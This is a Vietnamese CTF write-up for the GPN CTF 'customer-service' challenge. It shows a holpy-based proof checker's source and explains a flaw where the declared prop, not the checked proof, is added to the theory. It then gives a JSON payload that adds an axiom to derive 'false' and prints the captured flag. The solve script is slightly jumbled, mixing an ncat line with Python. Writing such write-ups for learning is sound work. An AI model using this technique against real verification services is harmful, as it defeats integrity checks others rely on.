---
layout: post
title: "GPN CTF : custom server"
tags: [writeup, ctf]
---
{% raw %}

customer-service finished (Miscellaneous) by s1nn105
---

Mô tả:

The customer is always right. RIGHT? Experienced staff will tell you that customers are always worst case users. Just last week one customer proclaimed that pineapple does not belong on sushi pizza. Yeah I know, how could he? But the customer is always right. My friend fears for his sanity. So please help me work out the logic details for such an argument.

---
### Đầu tiên mình tải file về

<img width="778" height="471" alt="image" src="https://github.com/user-attachments/assets/9e7df565-7242-4c30-b1c8-074786962354" />


### mình kết nối vào instance

```
ncat --ssl torched-kimchi-stuffed-with-toasted-wine-smzt.gpn24.ctf.kitctf.de 443
```

Service hiện ngay:

```
give me your hex proof
```

<img width="1008" height="315" alt="image" src="https://github.com/user-attachments/assets/1f804359-5627-47a1-951a-f2a6447feeeb" />


Vậy là service nhận vào một chuỗi hex. Mình giải nén `customer-service.tar.gz` để xem source.

<img width="406" height="212" alt="image" src="https://github.com/user-attachments/assets/237bb9a7-9ebd-45e4-9fbc-ab3efa16e928" />

---

### Phân tích source

Bên trong có `checker.py`. 
```
─(darkzero@parrot)-[~/Downloads/customer-service]
└─$ cat checker.py
# To run: uv run checker.py

import json
import sys


from holpy import logic, kernel, server
from holpy.logic import basic
from holpy.kernel import theory
from holpy.server import items, monitor


def win():
with open("./flag.txt", "r") as f:
flag = f.read().strip()
print(f"Congratulations! You've found the flag: {flag}")


def theorem_proves_false_unconditioned(thm):
"""Check if theorem proves 'false' with no assumptions or hypotheses.

Args:
thm: A Thm object to check

Returns:
True if theorem conclusion is false and has no assumptions/hypotheses
"""
try:
# Check if conclusion is the false constant OR a variable named False/false
concl_str = str(thm.concl).strip().lower()
is_false = (
thm.concl.is_const("false") or concl_str == "false" or concl_str == "?false"
)

# Check if there are no assumptions (assumptions are premises to the theorem)
no_assumptions = len(thm.assums) == 0

# Check if there are no hypotheses (hyps are implicit assumptions)
no_hypotheses = len(thm.hyps) == 0

return is_false and no_assumptions and no_hypotheses
except Exception as e:
print(f"Warning: error checking theorem: {e}")
return False


if __name__ == "__main__":

hex_proof = input("give me your hex proof")
proof = bytes.fromhex(hex_proof).decode("utf-8")

# Load JSON file directly
try:
data = json.loads(proof)
except Exception as e:
print(f"Failed to load JSON: {e}")
sys.exit(1)

# Load imports from the JSON file
with theory.fresh_theory():
imports = data.get("imports", [])
for imp in imports:
try:
# Import names don't have .json extension in the JSON
basic.load_theory(imp)
except Exception as e:
print(f"Warning: failed to load import '{imp}': {e}")

content = data.get("content", [])
for idx in range(len(content)):

raw_item = content[idx]
item = items.parse_item(raw_item)
if item.error:
print(f"Warning: parse error for item {idx}: {item.error}")
continue
# HELP WTF IS THIS IG
if item.ty == "thm":
result = monitor.check_proof(item, rewrite=False)

if result["status"] in ["OK", "ProofOK"]:
print("✓ Proof check passed")

exts = item.get_extension()

report =theory.thy.checked_extend(exts)
if (len(report.get_axioms())) > 1:
print("✗ Too many axioms introduced")
sys.exit(1)
elif report.get_axioms() == 1 and item.ty != "thm":
sys.exit(1)
try:
thm = theory.thy.get_theorem(item.name)

if theorem_proves_false_unconditioned(thm):
win()
sys.exit(2)
except Exception as e:
print(f"Error getting theorem: {e}")

sys.exit(0)
else:
print("✗ Proof check failed")
sys.exit(1)
# ig we addd it ??
else:
exts = item.get_extension()

report =theory.thy.checked_extend(exts)
if (len(report.get_axioms())) > 1:
print("✗ Too many axioms introduced")
sys.exit(1)
elif report.get_axioms() == 1 and item.ty != "thm":
sys.exit(1)
```
Phân tích source
Bên trong có checker.py. Đây là file chứa lỗ hổng chính.
Flow của service:
```
pythonhex_proof = input("give me your hex proof")
proof = bytes.fromhex(hex_proof).decode("utf-8")
data = json.loads(proof)
```
Tức là mình cần gửi JSON được hex encode.
Sau đó service load import rồi duyệt từng item trong content:
```
pythonimports = data.get("imports", [])
for imp in imports:
    basic.load_theory(imp)

content = data.get("content", [])
for idx in range(len(content)):
    raw_item = content[idx]
    item = items.parse_item(raw_item)
```
Nếu item là theorem, nó kiểm tra proof trước:
```
pythonif item.ty == "thm":
    result = monitor.check_proof(item, rewrite=False)
```
Nếu proof pass:
```
pythonif result["status"] in ["OK", "ProofOK"]:
    print("✓ Proof check passed")

    exts = item.get_extension()
    report = theory.thy.checked_extend(exts)
```
Đây là đoạn quan trọng nhất.

Điều kiện lấy flag
Hàm win check như sau:
```
pythondef theorem_proves_false_unconditioned(thm):
    concl_str = str(thm.concl).strip().lower()
    is_false = (
        thm.concl.is_const("false") or concl_str == "false" or concl_str == "?false"
    )
    no_assumptions = len(thm.assums) == 0
    no_hypotheses = len(thm.hyps) == 0

    return is_false and no_assumptions and no_hypotheses
```
Nghĩa là chỉ cần trong theory có một theorem:
``` |- false```
Không có assumption, không có hypothesis -> server in flag.

Vấn đề nằm ở đây:
```
python# Kiểm proof hợp lệ không
result = monitor.check_proof(item, rewrite=False)

if result["status"] in ["OK", "ProofOK"]:
    # Lấy extension từ item user gửi lên
    exts = item.get_extension()
    # Add theorem vào theory
    report = theory.thy.checked_extend(exts)
```
Server kiểm proof một thứ, nhưng add theorem từ item.prop do user khai báo.
Tức là:

Proof có thể chứng minh bất cứ thứ gì hợp lệ
Nhưng theorem được add vào theory lại phụ thuộc vào prop mình tự ghi

Mình ghi prop: "false", proof checker pass -> server add |- false vào theory -> win check thấy -> in flag.

### Script 
```
ncat --ssl poached-pizza-crusted-with-pickled-chimichurri-ljtk.gpn24.ctf.kitctf.de 443
import json, sys, time
payload = {
"imports": [],
"content": [
{"ty": "thm.ax", "name": "bad", "vars": {"false": "bool"}, "prop": "false"},
{
"ty": "thm", "name": "pwn", "vars": {"false": "bool"}, "prop": "false",
"proof": [{"id": "0", "rule": "theorem", "args": "bad", "prevs": [], "th": ""}],
"num_gaps": 0
}
]
}
sys.stdout.buffer.write((json.dumps(payload, separators=(',', ':')).encode().hex() + "\n").encode())
sys.stdout.buffer.flush()
time.sleep(3)
PY
```

<img width="946" height="394" alt="image" src="https://github.com/user-attachments/assets/e6ae2ddd-6050-48a4-8b71-5d9301667ff4" />


Kết quả:

```
Proof check passed
Congratulations! You've found the flag: GPNCTF{Ex-un4-11nE4-VacUa-53QUI7uR-QuOdLiBe7}
```

---

## Flag

```
GPNCTF{Ex-un4-11nE4-VacUa-53QUI7uR-QuOdLiBe7}
```
---

**ZeroD**


{% endraw %}
